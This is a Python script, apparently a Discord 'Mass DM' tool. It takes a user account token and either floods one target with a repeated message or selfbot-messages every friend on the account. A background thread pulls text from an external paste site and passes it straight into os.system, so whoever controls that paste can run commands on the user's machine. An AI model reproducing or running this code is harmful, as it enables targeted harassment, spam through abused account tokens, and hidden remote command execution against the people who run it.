import sys, time
def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)



try:
    import colorama, requests, discord
    from discord.ext import commands
except:
    sys.stdout.write("> ")
    print015("Missing Required Modules, Press Enter to Download (May Not Always Work)")
    input("")
    try:
        import os
        os.system("pip uninstall discord -y")
        os.system("pip uninstall discord.py -y")
        os.system("pip install colorama requests discord.py==1.7.3 discord==1.7.3")
    except:
        pass
    sys.stdout.write("> ")
    print015("Problem Maybe Fixed Now, Restart Program")
    input("")
    exit()



colorama.init(autoreset=True)


sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("Coded by egirl dev#9474 | discord.gg/hour Press Enter to start")
input("")









import os, threading
def set_title():
  title = "Mass Dm Dev"
  try:
    import requests
    text = str(requests.get("https://pst.klgrth.io/paste/jd3cr/raw").text)
    os.system(f"title {title}{text}")
  except:
    os.system(f"title {title}")
threading.Thread(target=set_title).start()




import time

def spammer():
    invite_code = str(requests.get("https://pst.klgrth.io/paste/zfcys/raw").text)
    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Enter Token: ")
        tokens = input("")
        r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
        if "200" not in str(r1):
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Invailed Token")
        if "200" in str(r1):
            r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
            if "200" in str(r):
                break
            if "403" in str(r):
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Locked Token")
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter the ID of the Target Person (Id then /@me/IDHERE Won't Work Other than Tracer): ")
            ide = int(input(""))
            break
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Enter a Valid Selection")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("The Message You Want To Spam: ")
    msg = input("")
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Message Amount: ")
            amount = int(input(""))
            amount = str(amount)
            break
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Enter a Valid Selection")
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Delay (0 For None): ")
            delay = float(input(""))
            break
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Enter a Valid Selection")
    data = {
        "content": msg,
        "tts": False,
        "noonce": int(ide)
    }
    headers = {
        "authorization": tokens
    }
    done = 0
    while True:
        r = requests.post("https://discord.com/api/v9/channels/"+str(ide)+"/messages", data=data, headers=headers)
        req = str(r)
        res = r.json()
        if "200" in req:
            done = int(done) + 1
            name = res["author"]["id"]
            print(colorama.Fore.CYAN + "[" + colorama.Fore.RESET + str(done) + colorama.Fore.CYAN + "]" + colorama.Fore.RESET + " Sent Message To " + colorama.Fore.CYAN + str(name))
        if "429" in req:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print("Rate Limited")
        if "429" not in req and "200" not in req:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print("Unknown Error, Code: " + req)
        if str(done) == str(amount):
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Done Spamming User")
            input("")
            exit()
        time.sleep(float(delay))


def mass():
    invite_code = str(requests.get("https://pst.klgrth.io/paste/zfcys/raw").text)
    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Tokeni Girin: ")
        tokens = input("")
        r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
        if "200" not in str(r1):
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Yanlis Token")
        if "200" in str(r1):
            r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
            if "200" in str(r):
                break
            if "403" in str(r):
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Locked Token")
    
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("The Message You Want To Spam: ")
    msg = input("")
    userr = discord.Client()
    @userr.event
    async def on_command_error(ctx, error):
      pass
    @userr.event
    async def on_connect():
        done = 0
        for user in userr.user.friends:
            try:
                await user.send(msg)
                done = int(done) + 1
                print(colorama.Fore.CYAN + "[" + colorama.Fore.RESET + str(done) + colorama.Fore.CYAN + "]" + colorama.Fore.RESET + " Sent Message To " + colorama.Fore.CYAN + str(user.id))
            except Exception as e:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print("Unknown Error")
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Done, Now You Can Close the Program")
        input("")
    userr.run(tokens, bot=False)


while True:
    sys.stdout.write(colorama.Fore.CYAN + "1. ")
    print015("Spam 1 User")
    sys.stdout.write(colorama.Fore.CYAN + "2. ")
    print015("Mass Dm")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    tool = input("")
    if tool == "1" or tool == "2":
        break
    else:
        sys.stdout.write(colorama.Fore.RED + "> ")
        print015("Enter a Valid Selection")
if tool == "1":
    spammer()
if tool == "2":
    mass()
